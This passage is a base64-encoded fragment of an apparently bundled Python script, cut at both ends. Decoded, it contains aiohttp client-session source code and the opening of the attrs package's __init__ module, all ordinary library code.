BOb25lXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2xvc2VkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiSXMgY2xpZW50IHNlc3Npb24gY2xvc2VkLlxyXG5cclxuICAgICAgICBBIHJlYWRvbmx5IHByb3BlcnR5LlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jb25uZWN0b3IgaXMgTm9uZSBvciBzZWxmLl9jb25uZWN0b3IuY2xvc2VkXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY29ubmVjdG9yKHNlbGYpIC0+IE9wdGlvbmFsW0Jhc2VDb25uZWN0b3JdOlxyXG4gICAgICAgICIiIkNvbm5lY3RvciBpbnN0YW5jZSB1c2VkIGZvciB0aGUgc2Vzc2lvbi4iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fY29ubmVjdG9yXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY29va2llX2phcihzZWxmKSAtPiBBYnN0cmFjdENvb2tpZUphcjpcclxuICAgICAgICAiIiJUaGUgc2Vzc2lvbiBjb29raWVzLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jb29raWVfamFyXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdmVyc2lvbihzZWxmKSAtPiBUdXBsZVtpbnQsIGludF06XHJcbiAgICAgICAgIiIiVGhlIHNlc3Npb24gSFRUUCBwcm90b2NvbCB2ZXJzaW9uLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl92ZXJzaW9uXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgcmVxdW90ZV9yZWRpcmVjdF91cmwoc2VsZikgLT4gYm9vbDpcclxuICAgICAgICAiIiJEbyBVUkwgcmVxdW90aW5nIG9uIHJlZGlyZWN0aW9uIGhhbmRsaW5nLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9yZXF1b3RlX3JlZGlyZWN0X3VybFxyXG5cclxuICAgIEByZXF1b3RlX3JlZGlyZWN0X3VybC5zZXR0ZXJcclxuICAgIGRlZiByZXF1b3RlX3JlZGlyZWN0X3VybChzZWxmLCB2YWw6IGJvb2wpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiRG8gVVJMIHJlcXVvdGluZyBvbiByZWRpcmVjdGlvbiBoYW5kbGluZy4iIiJcclxuICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAic2Vzc2lvbi5yZXF1b3RlX3JlZGlyZWN0X3VybCBtb2RpZmljYXRpb24gIiAiaXMgZGVwcmVjYXRlZCAjMjc3OCIsXHJcbiAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9yZXF1b3RlX3JlZGlyZWN0X3VybCA9IHZhbFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGxvb3Aoc2VsZikgLT4gYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcDpcclxuICAgICAgICAiIiJTZXNzaW9uXCdzIGxvb3AuIiIiXHJcbiAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgImNsaWVudC5sb29wIHByb3BlcnR5IGlzIGRlcHJlY2F0ZWQiLCBEZXByZWNhdGlvbldhcm5pbmcsIHN0YWNrbGV2ZWw9MlxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gc2VsZi5fbG9vcFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHRpbWVvdXQoc2VsZikgLT4gVW5pb25bb2JqZWN0LCBDbGllbnRUaW1lb3V0XTpcclxuICAgICAgICAiIiJUaW1lb3V0IGZvciB0aGUgc2Vzc2lvbi4iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fdGltZW91dFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGhlYWRlcnMoc2VsZikgLT4gIkNJTXVsdGlEaWN0W3N0cl0iOlxyXG4gICAgICAgICIiIlRoZSBkZWZhdWx0IGhlYWRlcnMgb2YgdGhlIGNsaWVudCBzZXNzaW9uLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9kZWZhdWx0X2hlYWRlcnNcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBza2lwX2F1dG9faGVhZGVycyhzZWxmKSAtPiBGcm96ZW5TZXRbaXN0cl06XHJcbiAgICAgICAgIiIiSGVhZGVycyBmb3Igd2hpY2ggYXV0b2dlbmVyYXRpb24gc2hvdWxkIGJlIHNraXBwZWQiIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fc2tpcF9hdXRvX2hlYWRlcnNcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBhdXRoKHNlbGYpIC0+IE9wdGlvbmFsW0Jhc2ljQXV0aF06XHJcbiAgICAgICAgIiIiQW4gb2JqZWN0IHRoYXQgcmVwcmVzZW50cyBIVFRQIEJhc2ljIEF1dGhvcml6YXRpb24iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fZGVmYXVsdF9hdXRoXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYganNvbl9zZXJpYWxpemUoc2VsZikgLT4gSlNPTkVuY29kZXI6XHJcbiAgICAgICAgIiIiSnNvbiBzZXJpYWxpemVyIGNhbGxhYmxlIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2pzb25fc2VyaWFsaXplXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY29ubmVjdG9yX293bmVyKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiU2hvdWxkIGNvbm5lY3RvciBiZSBjbG9zZWQgb24gc2Vzc2lvbiBjbG9zaW5nIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2Nvbm5lY3Rvcl9vd25lclxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHJhaXNlX2Zvcl9zdGF0dXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICkgLT4gVW5pb25bYm9vbCwgQ2FsbGFibGVbW0NsaWVudFJlc3BvbnNlXSwgQXdhaXRhYmxlW05vbmVdXV06XHJcbiAgICAgICAgIiIiU2hvdWxkIGBDbGllbnRSZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKClgIGJlIGNhbGxlZCBmb3IgZWFjaCByZXNwb25zZS4iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fcmFpc2VfZm9yX3N0YXR1c1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGF1dG9fZGVjb21wcmVzcyhzZWxmKSAtPiBib29sOlxyXG4gICAgICAgICIiIlNob3VsZCB0aGUgYm9keSByZXNwb25zZSBiZSBhdXRvbWF0aWNhbGx5IGRlY29tcHJlc3NlZC4iIiJcclxuICAgICAgICByZXR1cm4gc2VsZi5fYXV0b19kZWNvbXByZXNzXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgdHJ1c3RfZW52KHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgU2hvdWxkIHByb3hpZXMgaW5mb3JtYXRpb24gZnJvbSBlbnZpcm9ubWVudCBvciBuZXRyYyBiZSB0cnVzdGVkLlxyXG5cclxuICAgICAgICBJbmZvcm1hdGlvbiBpcyBmcm9tIEhUVFBfUFJPWFkgLyBIVFRQU19QUk9YWSBlbnZpcm9ubWVudCB2YXJpYWJsZXNcclxuICAgICAgICBvciB+Ly5uZXRyYyBmaWxlIGlmIHByZXNlbnQuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3RydXN0X2VudlxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHRyYWNlX2NvbmZpZ3Moc2VsZikgLT4gTGlzdFtUcmFjZUNvbmZpZ106XHJcbiAgICAgICAgIiIiQSBsaXN0IG9mIFRyYWNlQ29uZmlnIGluc3RhbmNlcyB1c2VkIGZvciBjbGllbnQgdHJhY2luZyIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl90cmFjZV9jb25maWdzXHJcblxyXG4gICAgZGVmIGRldGFjaChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgICIiIkRldGFjaCBjb25uZWN0b3IgZnJvbSBzZXNzaW9uIHdpdGhvdXQgY2xvc2luZyB0aGUgZm9ybWVyLlxyXG5cclxuICAgICAgICBTZXNzaW9uIGlzIHN3aXRjaGVkIHRvIGNsb3NlZCBzdGF0ZSBhbnl3YXkuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgc2VsZi5fY29ubmVjdG9yID0gTm9uZVxyXG5cclxuICAgIGRlZiBfX2VudGVyX18oc2VsZikgLT4gTm9uZTpcclxuICAgICAgICByYWlzZSBUeXBlRXJyb3IoIlVzZSBhc3luYyB3aXRoIGluc3RlYWQiKVxyXG5cclxuICAgIGRlZiBfX2V4aXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGV4Y190eXBlOiBPcHRpb25hbFtUeXBlW0Jhc2VFeGNlcHRpb25dXSxcclxuICAgICAgICBleGNfdmFsOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXSxcclxuICAgICAgICBleGNfdGI6IE9wdGlvbmFsW1RyYWNlYmFja1R5cGVdLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgICMgX19leGl0X18gc2hvdWxkIGV4aXN0IGluIHBhaXIgd2l0aCBfX2VudGVyX18gYnV0IG5ldmVyIGV4ZWN1dGVkXHJcbiAgICAgICAgcGFzcyAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcblxyXG4gICAgYXN5bmMgZGVmIF9fYWVudGVyX18oc2VsZikgLT4gIkNsaWVudFNlc3Npb24iOlxyXG4gICAgICAgIHJldHVybiBzZWxmXHJcblxyXG4gICAgYXN5bmMgZGVmIF9fYWV4aXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGV4Y190eXBlOiBPcHRpb25hbFtUeXBlW0Jhc2VFeGNlcHRpb25dXSxcclxuICAgICAgICBleGNfdmFsOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXSxcclxuICAgICAgICBleGNfdGI6IE9wdGlvbmFsW1RyYWNlYmFja1R5cGVdLFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIGF3YWl0IHNlbGYuY2xvc2UoKVxyXG5cclxuXHJcbmNsYXNzIF9CYXNlUmVxdWVzdENvbnRleHRNYW5hZ2VyKENvcm91dGluZVtBbnksIEFueSwgX1JldFR5cGVdLCBHZW5lcmljW19SZXRUeXBlXSk6XHJcblxyXG4gICAgX19zbG90c19fID0gKCJfY29ybyIsICJfcmVzcCIpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvcm86IENvcm91dGluZVsiYXN5bmNpby5GdXR1cmVbQW55XSIsIE5vbmUsIF9SZXRUeXBlXSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9jb3JvID0gY29yb1xyXG5cclxuICAgIGRlZiBzZW5kKHNlbGYsIGFyZzogTm9uZSkgLT4gImFzeW5jaW8uRnV0dXJlW0FueV0iOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9jb3JvLnNlbmQoYXJnKVxyXG5cclxuICAgIGRlZiB0aHJvdyhzZWxmLCBhcmc6IEJhc2VFeGNlcHRpb24pIC0+IE5vbmU6ICAjIHR5cGU6IGlnbm9yZVthcmctdHlwZSxvdmVycmlkZV1cclxuICAgICAgICBzZWxmLl9jb3JvLnRocm93KGFyZylcclxuXHJcbiAgICBkZWYgY2xvc2Uoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fY29yby5jbG9zZSgpXHJcblxyXG4gICAgZGVmIF9fYXdhaXRfXyhzZWxmKSAtPiBHZW5lcmF0b3JbQW55LCBOb25lLCBfUmV0VHlwZV06XHJcbiAgICAgICAgcmV0ID0gc2VsZi5fY29yby5fX2F3YWl0X18oKVxyXG4gICAgICAgIHJldHVybiByZXRcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZikgLT4gR2VuZXJhdG9yW0FueSwgTm9uZSwgX1JldFR5cGVdOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9fYXdhaXRfXygpXHJcblxyXG4gICAgYXN5bmMgZGVmIF9fYWVudGVyX18oc2VsZikgLT4gX1JldFR5cGU6XHJcbiAgICAgICAgc2VsZi5fcmVzcCA9IGF3YWl0IHNlbGYuX2Nvcm9cclxuICAgICAgICByZXR1cm4gc2VsZi5fcmVzcFxyXG5cclxuXHJcbmNsYXNzIF9SZXF1ZXN0Q29udGV4dE1hbmFnZXIoX0Jhc2VSZXF1ZXN0Q29udGV4dE1hbmFnZXJbQ2xpZW50UmVzcG9uc2VdKTpcclxuICAgIF9fc2xvdHNfXyA9ICgpXHJcblxyXG4gICAgYXN5bmMgZGVmIF9fYWV4aXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGV4Y190eXBlOiBPcHRpb25hbFtUeXBlW0Jhc2VFeGNlcHRpb25dXSxcclxuICAgICAgICBleGM6IE9wdGlvbmFsW0Jhc2VFeGNlcHRpb25dLFxyXG4gICAgICAgIHRiOiBPcHRpb25hbFtUcmFjZWJhY2tUeXBlXSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICAjIFdlXCdyZSBiYXNpbmcgYmVoYXZpb3Igb24gdGhlIGV4Y2VwdGlvbiBhcyBpdCBjYW4gYmUgY2F1c2VkIGJ5XHJcbiAgICAgICAgIyB1c2VyIGNvZGUgdW5yZWxhdGVkIHRvIHRoZSBzdGF0dXMgb2YgdGhlIGNvbm5lY3Rpb24uICBJZiB5b3VcclxuICAgICAgICAjIHdvdWxkIGxpa2UgdG8gY2xvc2UgYSBjb25uZWN0aW9uIHlvdSBtdXN0IGRvIHRoYXRcclxuICAgICAgICAjIGV4cGxpY2l0bHkuICBPdGhlcndpc2UgY29ubmVjdGlvbiBlcnJvciBoYW5kbGluZyBzaG91bGQga2ljayBpblxyXG4gICAgICAgICMgYW5kIGNsb3NlL3JlY3ljbGUgdGhlIGNvbm5lY3Rpb24gYXMgcmVxdWlyZWQuXHJcbiAgICAgICAgc2VsZi5fcmVzcC5yZWxlYXNlKClcclxuXHJcblxyXG5jbGFzcyBfV1NSZXF1ZXN0Q29udGV4dE1hbmFnZXIoX0Jhc2VSZXF1ZXN0Q29udGV4dE1hbmFnZXJbQ2xpZW50V2ViU29ja2V0UmVzcG9uc2VdKTpcclxuICAgIF9fc2xvdHNfXyA9ICgpXHJcblxyXG4gICAgYXN5bmMgZGVmIF9fYWV4aXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGV4Y190eXBlOiBPcHRpb25hbFtUeXBlW0Jhc2VFeGNlcHRpb25dXSxcclxuICAgICAgICBleGM6IE9wdGlvbmFsW0Jhc2VFeGNlcHRpb25dLFxyXG4gICAgICAgIHRiOiBPcHRpb25hbFtUcmFjZWJhY2tUeXBlXSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBhd2FpdCBzZWxmLl9yZXNwLmNsb3NlKClcclxuXHJcblxyXG5jbGFzcyBfU2Vzc2lvblJlcXVlc3RDb250ZXh0TWFuYWdlcjpcclxuXHJcbiAgICBfX3Nsb3RzX18gPSAoIl9jb3JvIiwgIl9yZXNwIiwgIl9zZXNzaW9uIilcclxuXHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBjb3JvOiBDb3JvdXRpbmVbImFzeW5jaW8uRnV0dXJlW0FueV0iLCBOb25lLCBDbGllbnRSZXNwb25zZV0sXHJcbiAgICAgICAgc2Vzc2lvbjogQ2xpZW50U2Vzc2lvbixcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9jb3JvID0gY29yb1xyXG4gICAgICAgIHNlbGYuX3Jlc3AgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW0NsaWVudFJlc3BvbnNlXVxyXG4gICAgICAgIHNlbGYuX3Nlc3Npb24gPSBzZXNzaW9uXHJcblxyXG4gICAgYXN5bmMgZGVmIF9fYWVudGVyX18oc2VsZikgLT4gQ2xpZW50UmVzcG9uc2U6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBzZWxmLl9yZXNwID0gYXdhaXQgc2VsZi5fY29yb1xyXG4gICAgICAgIGV4Y2VwdCBCYXNlRXhjZXB0aW9uOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLl9zZXNzaW9uLmNsb3NlKClcclxuICAgICAgICAgICAgcmFpc2VcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fcmVzcFxyXG5cclxuICAgIGFzeW5jIGRlZiBfX2FleGl0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBleGNfdHlwZTogT3B0aW9uYWxbVHlwZVtCYXNlRXhjZXB0aW9uXV0sXHJcbiAgICAgICAgZXhjOiBPcHRpb25hbFtCYXNlRXhjZXB0aW9uXSxcclxuICAgICAgICB0YjogT3B0aW9uYWxbVHJhY2ViYWNrVHlwZV0sXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3Jlc3AgaXMgbm90IE5vbmVcclxuICAgICAgICBzZWxmLl9yZXNwLmNsb3NlKClcclxuICAgICAgICBhd2FpdCBzZWxmLl9zZXNzaW9uLmNsb3NlKClcclxuXHJcblxyXG5kZWYgcmVxdWVzdChcclxuICAgIG1ldGhvZDogc3RyLFxyXG4gICAgdXJsOiBTdHJPclVSTCxcclxuICAgICosXHJcbiAgICBwYXJhbXM6IE9wdGlvbmFsW01hcHBpbmdbc3RyLCBzdHJdXSA9IE5vbmUsXHJcbiAgICBkYXRhOiBBbnkgPSBOb25lLFxyXG4gICAganNvbjogQW55ID0gTm9uZSxcclxuICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgc2tpcF9hdXRvX2hlYWRlcnM6IE9wdGlvbmFsW0l0ZXJhYmxlW3N0cl1dID0gTm9uZSxcclxuICAgIGF1dGg6IE9wdGlvbmFsW0Jhc2ljQXV0aF0gPSBOb25lLFxyXG4gICAgYWxsb3dfcmVkaXJlY3RzOiBib29sID0gVHJ1ZSxcclxuICAgIG1heF9yZWRpcmVjdHM6IGludCA9IDEwLFxyXG4gICAgY29tcHJlc3M6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgY2h1bmtlZDogT3B0aW9uYWxbYm9vbF0gPSBOb25lLFxyXG4gICAgZXhwZWN0MTAwOiBib29sID0gRmFsc2UsXHJcbiAgICByYWlzZV9mb3Jfc3RhdHVzOiBPcHRpb25hbFtib29sXSA9IE5vbmUsXHJcbiAgICByZWFkX3VudGlsX2VvZjogYm9vbCA9IFRydWUsXHJcbiAgICBwcm94eTogT3B0aW9uYWxbU3RyT3JVUkxdID0gTm9uZSxcclxuICAgIHByb3h5X2F1dGg6IE9wdGlvbmFsW0Jhc2ljQXV0aF0gPSBOb25lLFxyXG4gICAgdGltZW91dDogVW5pb25bQ2xpZW50VGltZW91dCwgb2JqZWN0XSA9IHNlbnRpbmVsLFxyXG4gICAgY29va2llczogT3B0aW9uYWxbTG9vc2VDb29raWVzXSA9IE5vbmUsXHJcbiAgICB2ZXJzaW9uOiBIdHRwVmVyc2lvbiA9IGh0dHAuSHR0cFZlcnNpb24xMSxcclxuICAgIGNvbm5lY3RvcjogT3B0aW9uYWxbQmFzZUNvbm5lY3Rvcl0gPSBOb25lLFxyXG4gICAgcmVhZF9idWZzaXplOiBPcHRpb25hbFtpbnRdID0gTm9uZSxcclxuICAgIGxvb3A6IE9wdGlvbmFsW2FzeW5jaW8uQWJzdHJhY3RFdmVudExvb3BdID0gTm9uZSxcclxuKSAtPiBfU2Vzc2lvblJlcXVlc3RDb250ZXh0TWFuYWdlcjpcclxuICAgICIiIkNvbnN0cnVjdHMgYW5kIHNlbmRzIGEgcmVxdWVzdC5cclxuXHJcbiAgICBSZXR1cm5zIHJlc3BvbnNlIG9iamVjdC5cclxuICAgIG1ldGhvZCAtIEhUVFAgbWV0aG9kXHJcbiAgICB1cmwgLSByZXF1ZXN0IHVybFxyXG4gICAgcGFyYW1zIC0gKG9wdGlvbmFsKSBEaWN0aW9uYXJ5IG9yIGJ5dGVzIHRvIGJlIHNlbnQgaW4gdGhlIHF1ZXJ5XHJcbiAgICAgIHN0cmluZyBvZiB0aGUgbmV3IHJlcXVlc3RcclxuICAgIGRhdGEgLSAob3B0aW9uYWwpIERpY3Rpb25hcnksIGJ5dGVzLCBvciBmaWxlLWxpa2Ugb2JqZWN0IHRvXHJcbiAgICAgIHNlbmQgaW4gdGhlIGJvZHkgb2YgdGhlIHJlcXVlc3RcclxuICAgIGpzb24gLSAob3B0aW9uYWwpIEFueSBqc29uIGNvbXBhdGlibGUgcHl0aG9uIG9iamVjdFxyXG4gICAgaGVhZGVycyAtIChvcHRpb25hbCkgRGljdGlvbmFyeSBvZiBIVFRQIEhlYWRlcnMgdG8gc2VuZCB3aXRoXHJcbiAgICAgIHRoZSByZXF1ZXN0XHJcbiAgICBjb29raWVzIC0gKG9wdGlvbmFsKSBEaWN0IG9iamVjdCB0byBzZW5kIHdpdGggdGhlIHJlcXVlc3RcclxuICAgIGF1dGggLSAob3B0aW9uYWwpIEJhc2ljQXV0aCBuYW1lZCB0dXBsZSByZXByZXNlbnQgSFRUUCBCYXNpYyBBdXRoXHJcbiAgICBhdXRoIC0gYWlvaHR0cC5oZWxwZXJzLkJhc2ljQXV0aFxyXG4gICAgYWxsb3dfcmVkaXJlY3RzIC0gKG9wdGlvbmFsKSBJZiBzZXQgdG8gRmFsc2UsIGRvIG5vdCBmb2xsb3dcclxuICAgICAgcmVkaXJlY3RzXHJcbiAgICB2ZXJzaW9uIC0gUmVxdWVzdCBIVFRQIHZlcnNpb24uXHJcbiAgICBjb21wcmVzcyAtIFNldCB0byBUcnVlIGlmIHJlcXVlc3QgaGFzIHRvIGJlIGNvbXByZXNzZWRcclxuICAgICAgIHdpdGggZGVmbGF0ZSBlbmNvZGluZy5cclxuICAgIGNodW5rZWQgLSBTZXQgdG8gY2h1bmsgc2l6ZSBmb3IgY2h1bmtlZCB0cmFuc2ZlciBlbmNvZGluZy5cclxuICAgIGV4cGVjdDEwMCAtIEV4cGVjdCAxMDAtY29udGludWUgcmVzcG9uc2UgZnJvbSBzZXJ2ZXIuXHJcbiAgICBjb25uZWN0b3IgLSBCYXNlQ29ubmVjdG9yIHN1Yi1jbGFzcyBpbnN0YW5jZSB0byBzdXBwb3J0XHJcbiAgICAgICBjb25uZWN0aW9uIHBvb2xpbmcuXHJcbiAgICByZWFkX3VudGlsX2VvZiAtIFJlYWQgcmVzcG9uc2UgdW50aWwgZW9mIGlmIHJlc3BvbnNlXHJcbiAgICAgICBkb2VzIG5vdCBoYXZlIENvbnRlbnQtTGVuZ3RoIGhlYWRlci5cclxuICAgIGxvb3AgLSBPcHRpb25hbCBldmVudCBsb29wLlxyXG4gICAgdGltZW91dCAtIE9wdGlvbmFsIENsaWVudFRpbWVvdXQgc2V0dGluZ3Mgc3RydWN0dXJlLCA1bWluXHJcbiAgICAgICB0b3RhbCB0aW1lb3V0IGJ5IGRlZmF1bHQuXHJcbiAgICBVc2FnZTo6XHJcbiAgICAgID4+PiBpbXBvcnQgYWlvaHR0cFxyXG4gICAgICA+Pj4gcmVzcCA9IGF3YWl0IGFpb2h0dHAucmVxdWVzdChcJ0dFVFwnLCBcJ2h0dHA6Ly9weXRob24ub3JnL1wnKVxyXG4gICAgICA+Pj4gcmVzcFxyXG4gICAgICA8Q2xpZW50UmVzcG9uc2UocHl0aG9uLm9yZy8pIFsyMDBdPlxyXG4gICAgICA+Pj4gZGF0YSA9IGF3YWl0IHJlc3AucmVhZCgpXHJcbiAgICAiIiJcclxuICAgIGNvbm5lY3Rvcl9vd25lciA9IEZhbHNlXHJcbiAgICBpZiBjb25uZWN0b3IgaXMgTm9uZTpcclxuICAgICAgICBjb25uZWN0b3Jfb3duZXIgPSBUcnVlXHJcbiAgICAgICAgY29ubmVjdG9yID0gVENQQ29ubmVjdG9yKGxvb3A9bG9vcCwgZm9yY2VfY2xvc2U9VHJ1ZSlcclxuXHJcbiAgICBzZXNzaW9uID0gQ2xpZW50U2Vzc2lvbihcclxuICAgICAgICBsb29wPWxvb3AsXHJcbiAgICAgICAgY29va2llcz1jb29raWVzLFxyXG4gICAgICAgIHZlcnNpb249dmVyc2lvbixcclxuICAgICAgICB0aW1lb3V0PXRpbWVvdXQsXHJcbiAgICAgICAgY29ubmVjdG9yPWNvbm5lY3RvcixcclxuICAgICAgICBjb25uZWN0b3Jfb3duZXI9Y29ubmVjdG9yX293bmVyLFxyXG4gICAgKVxyXG5cclxuICAgIHJldHVybiBfU2Vzc2lvblJlcXVlc3RDb250ZXh0TWFuYWdlcihcclxuICAgICAgICBzZXNzaW9uLl9yZXF1ZXN0KFxyXG4gICAgICAgICAgICBtZXRob2QsXHJcbiAgICAgICAgICAgIHVybCxcclxuICAgICAgICAgICAgcGFyYW1zPXBhcmFtcyxcclxuICAgICAgICAgICAgZGF0YT1kYXRhLFxyXG4gICAgICAgICAgICBqc29uPWpzb24sXHJcbiAgICAgICAgICAgIGhlYWRlcnM9aGVhZGVycyxcclxuICAgICAgICAgICAgc2tpcF9hdXRvX2hlYWRlcnM9c2tpcF9hdXRvX2hlYWRlcnMsXHJcbiAgICAgICAgICAgIGF1dGg9YXV0aCxcclxuICAgICAgICAgICAgYWxsb3dfcmVkaXJlY3RzPWFsbG93X3JlZGlyZWN0cyxcclxuICAgICAgICAgICAgbWF4X3JlZGlyZWN0cz1tYXhfcmVkaXJlY3RzLFxyXG4gICAgICAgICAgICBjb21wcmVzcz1jb21wcmVzcyxcclxuICAgICAgICAgICAgY2h1bmtlZD1jaHVua2VkLFxyXG4gICAgICAgICAgICBleHBlY3QxMDA9ZXhwZWN0MTAwLFxyXG4gICAgICAgICAgICByYWlzZV9mb3Jfc3RhdHVzPXJhaXNlX2Zvcl9zdGF0dXMsXHJcbiAgICAgICAgICAgIHJlYWRfdW50aWxfZW9mPXJlYWRfdW50aWxfZW9mLFxyXG4gICAgICAgICAgICBwcm94eT1wcm94eSxcclxuICAgICAgICAgICAgcHJveHlfYXV0aD1wcm94eV9hdXRoLFxyXG4gICAgICAgICAgICByZWFkX2J1ZnNpemU9cmVhZF9idWZzaXplLFxyXG4gICAgICAgICksXHJcbiAgICAgICAgc2Vzc2lvbixcclxuICAgIClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2F0dHIvX19pbml0X18ucHknLCBiJyMgU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVFxuXG5mcm9tIF9fZnV0dXJlX18gaW1wb3J0IGFic29sdXRlX2ltcG9ydCwgZGl2aXNpb24sIHByaW50X2Z1bmN0aW9uXG5cbmltcG9ydCBzeXNcblxuZnJvbSBmdW5jdG9vbHMgaW1wb3J0IHBhcnRpYWxcblxuZnJvbSAuIGltcG9ydCBjb252ZXJ0ZXJzLCBleGNlcHRpb25zLCBmaWx0ZXJzLCBzZXR0ZXJzLCB2YWxpZGF0b3JzXG5mcm9tIC5fY21wIGltcG9ydCBjbXBfdXNpbmdcbmZyb20gLl9jb25maWcgaW1wb3J0IGdldF9ydW5fdmFsaWRhdG9ycywgc2V0X3J1bl92YWxpZGF0b3JzXG5mcm9tIC5fZnVuY3MgaW1wb3J0IGFzZGljdCwgYXNzb2MsIGFzdHVwbGUsIGV2b2x2ZSwgaGFzLCByZXNvbHZlX3R5cGVzXG5mcm9tIC5fbWFrZSBpbXBvcnQgKFxuICAgIE5PVEhJTkcsXG4gICAgQXR0cmlidXRlLFxuICAgIEZhY3RvcnksXG4gICAgYXR0cmliLFxuICAgIGF0dHJzLFxuICAgIGZpZWxkcyxcbiAgICBmaWVsZHNfZGljdCxcbiAgICBtYWtlX2NsYXNzLFxuICAgIHZhbGlkYXRlLFxuKVxuZnJvbSAuX3ZlcnNpb25faW5mbyBpbXBvcnQgVmVyc2lvbkluZm9cblxuXG5fX3ZlcnNpb25fXyA9ICIyMS40LjAiXG5fX3ZlcnNpb25faW5mb19fID0gVmVyc2lvbkluZm8uX2Zyb21fdmVyc2lvbl9zdHJpbmcoX192ZXJzaW9uX18pXG5cbl9fdGl0bGVfXyA9ICJhdHRycyJcbl9fZGVzY3JpcHRpb25fXyA9ICJDbGFzc2VzIFdpdGhvdXQgQm9pbGVycGxhdGUiXG5fX3VybF9fID0gImh0dHBzOi8vd3d3LmF0dHJzLm9yZy8iXG5fX3VyaV9fID0gX191cmxfX1xuX19kb2NfXyA9IF9fZGVzY3JpcHRpb25fXyArICIgPCIgKyBfX3VyaV9fICsgIj4iXG5cbl9fYXV0aG9yX18gPSAiSHluZWsgU2NobGF3YWNrIlxuX19lbWFpbF9fID0gImhzQG94LmN4IlxuXG5fX2xpY2Vuc2VfXyA9ICJNSVQiXG5fX2NvcHlyaWdodF9fID0gIkNvcHlyaWdodCAoYykgMjAxNSBIeW5layBTY2hsYXdhY2siXG5cblxucyA9IGF0dHJpYnV0ZXMgPSBhdHRyc1xuaWIgPS